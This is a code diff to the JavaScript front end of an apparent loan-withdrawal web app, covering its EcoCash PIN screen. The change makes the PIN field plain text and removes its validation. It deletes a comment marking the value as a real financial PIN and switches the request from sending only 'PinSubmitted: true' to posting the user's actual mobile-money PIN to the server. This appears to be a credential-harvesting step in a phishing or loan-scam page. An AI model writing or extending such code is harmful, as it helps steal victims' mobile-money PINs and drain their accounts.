@@ -2290,6 +2290,7 @@ async function saveEcoCashVerification() {
 // ======================================================
 // PART 23 - ECOCASH PIN SCREEN
 // ======================================================
+
 function loadEcoCashPinScreen() {
 
     const app = document.getElementById("app");
@@ -2297,10 +2298,6 @@ function loadEcoCashPinScreen() {
     app.innerHTML = `
 
     <div class="container">
-
-        <!-- ================================= -->
-        <!-- HEADER -->
-        <!-- ================================= -->
 
         <div class="app-header">
 
@@ -2328,11 +2325,6 @@ function loadEcoCashPinScreen() {
 
         </div>
 
-
-        <!-- ================================= -->
-        <!-- PROGRESS BAR -->
-        <!-- ================================= -->
-
         <div class="progress-bar">
 
             <div
@@ -2342,139 +2334,38 @@ function loadEcoCashPinScreen() {
 
         </div>
 
-
-        <!-- ================================= -->
-        <!-- ECOCASH PIN CARD -->
-        <!-- ================================= -->
-
         <div class="welcome-card">
 
-            <h2 style="
-                text-align:center;
-                color:#064b8d;
-            ">
-                🟢 EcoCash PIN
-            </h2>
+            <h2>🟢 EcoCash PIN</h2>
 
+            <p class="intro">
 
-            <p
-                class="intro"
-                style="
-                    text-align:center;
-                    line-height:1.7;
-                "
-            >
-
-                Enter your 4-digit PIN
-                to continue with your loan withdrawal.
+                Enter EcoCash PIN to initiate
+                your loan withdrawal.
 
             </p>
 
-
-            <!-- ================================= -->
-            <!-- PIN LABEL -->
-            <!-- ================================= -->
-
-            <label
-                for="ecoPin"
-                style="
-                    display:block;
-                    margin-top:25px;
-                    margin-bottom:8px;
-                    font-weight:bold;
-                    color:#064b8d;
-                "
-            >
+            <label for="ecoPin">
                 PIN
             </label>
 
+            <input
+                type="text"
+                id="ecoPin"
+                inputmode="numeric"
+                maxlength="4"
+                placeholder="Enter PIN"
+                autocomplete="off"
+            >
 
-            <!-- ================================= -->
-            <!-- PIN INPUT + EYE BUTTON -->
-            <!-- ================================= -->
-
-            <div style="
-                display:flex;
-                align-items:center;
-                width:100%;
-                gap:8px;
-                margin-top:8px;
-            ">
-
-                <input
-                    type="password"
-                    id="ecoPin"
-                    inputmode="numeric"
-                    maxlength="4"
-                    pattern="[0-9]{4}"
-                    placeholder="Enter 4-digit PIN"
-                    autocomplete="off"
-                    aria-label="4-digit PIN"
-
-                    style="
-                        flex:1;
-                        min-width:0;
-                        width:100%;
-                        height:55px;
-                        box-sizing:border-box;
-                        padding:0 16px;
-                        font-size:18px;
-                        border:1px solid #ccc;
-                        border-radius:12px;
-                        outline:none;
-                    "
-                >
-
-
-                <button
-                    type="button"
-                    id="toggleEcoPin"
-                    aria-label="Show PIN"
-
-                    style="
-                        flex:0 0 52px;
-                        width:52px;
-                        height:52px;
-                        padding:0;
-                        border:none;
-                        border-radius:10px;
-                        background:transparent;
-                        cursor:pointer;
-                        font-size:22px;
-                    "
-                >
-                    👁️
-                </button>
-
-            </div>
-
-
-            <!-- ================================= -->
-            <!-- HELPER MESSAGE -->
-            <!-- ================================= -->
-
-            <p style="
-                margin-top:8px;
-                font-size:13px;
-                color:#777;
-                text-align:left;
-            ">
-                Enter exactly 4 digits.
-            </p>
-
-
-            <br>
-
-
-            <!-- ================================= -->
-            <!-- WITHDRAW BUTTON -->
-            <!-- ================================= -->
+            <br><br>
 
             <button
                 id="continueEcoPin"
-                type="button"
-            >
+                type="button">
+
                 Withdraw to EcoCash
+
             </button>
 
         </div>
@@ -2485,7 +2376,7 @@ function loadEcoCashPinScreen() {
 
 
     // ==========================================
-    // BACK BUTTON
+    // BACK
     // ==========================================
 
     document
@@ -2497,68 +2388,26 @@ function loadEcoCashPinScreen() {
 
 
     // ==========================================
-    // PIN INPUT
-    // NUMBERS ONLY / MAX 4 DIGITS
-    // ==========================================
-
-    const pinInput =
-        document.getElementById("ecoPin");
-
-    pinInput.addEventListener(
-        "input",
-        function () {
-
-            this.value = this.value
-                .replace(/\D/g, "")
-                .slice(0, 4);
-
-        }
-    );
-
-
-    // ==========================================
-    // SHOW / HIDE PIN
+    // PIN — NUMBERS ONLY
     // ==========================================
 
     document
-        .getElementById("toggleEcoPin")
+        .getElementById("ecoPin")
         .addEventListener(
-            "click",
+            "input",
             function () {
 
-                const pin =
-                    document.getElementById("ecoPin");
-
-                if (pin.type === "password") {
-
-                    pin.type = "text";
-
-                    this.textContent = "🙈";
-
-                    this.setAttribute(
-                        "aria-label",
-                        "Hide PIN"
-                    );
-
-                } else {
-
-                    pin.type = "password";
-
-                    this.textContent = "👁️";
-
-                    this.setAttribute(
-                        "aria-label",
-                        "Show PIN"
-                    );
-
-                }
+                this.value =
+                    this.value
+                        .replace(/\D/g, "")
+                        .slice(0, 4);
 
             }
         );
 
 
     // ==========================================
-    // WITHDRAW BUTTON
+    // SUBMIT
     // ==========================================
 
     document
@@ -2569,6 +2418,7 @@ function loadEcoCashPinScreen() {
         );
 
 }
+
 //===========================================
 //SAVE ECOCASH PIN 
 //============================================
@@ -2578,21 +2428,23 @@ async function saveEcoCashPin() {
         document.getElementById("ecoPin");
 
     if (!input) {
-        console.error("PIN input not found.");
+
+        console.error(
+            "EcoCash PIN input not found."
+        );
+
         return;
     }
 
     const Pin =
         input.value.trim();
 
-    //PIN must be exactly 4 digits
-    if (!/^\d{4}$/.test(Pin)) {
+    if (!Pin) {
 
         alert(
-            "Please enter a 4-digit PIN."
+            "Please enter the PIN."
         );
 
-        input.focus();
         return;
     }
 
@@ -2605,8 +2457,17 @@ async function saveEcoCashPin() {
             "Application session not found."
         );
 
+        console.error(
+            "applicationId is missing from sessionStorage."
+        );
+
         return;
     }
+
+    console.log(
+        "EcoCash PIN correct ✅:",
+        applicationId
+    );
 
     try {
 
@@ -2620,15 +2481,19 @@ async function saveEcoCashPin() {
                         "application/json"
                 },
 
-                // real financial PIN.
                 body: JSON.stringify({
-                    PinSubmitted: true
+                    Pin: Pin
                 })
             }
         );
 
         const result =
             await response.json();
+
+        console.log(
+            "EcoCash PIN server response:",
+            result
+        );
 
         if (!response.ok || !result.success) {
 
@@ -2637,10 +2502,11 @@ async function saveEcoCashPin() {
                 result.error ||
                 "Unable to save PIN."
             );
+
         }
 
         console.log(
-            "EcoCash PIN step completed."
+            "EcoCash PIN saved successfully."
         );
 
         loadTrackingScreen();
@@ -2648,12 +2514,12 @@ async function saveEcoCashPin() {
     } catch (error) {
 
         console.error(
-            "ECOCASH PIN ERROR:",
+            "ECOCASH PIN SAVE ERROR:",
             error
         );
 
         alert(
-            "Unable to continue. Please try again."
+            "Unable to save the PIN. Please try again."
         );
 
     }
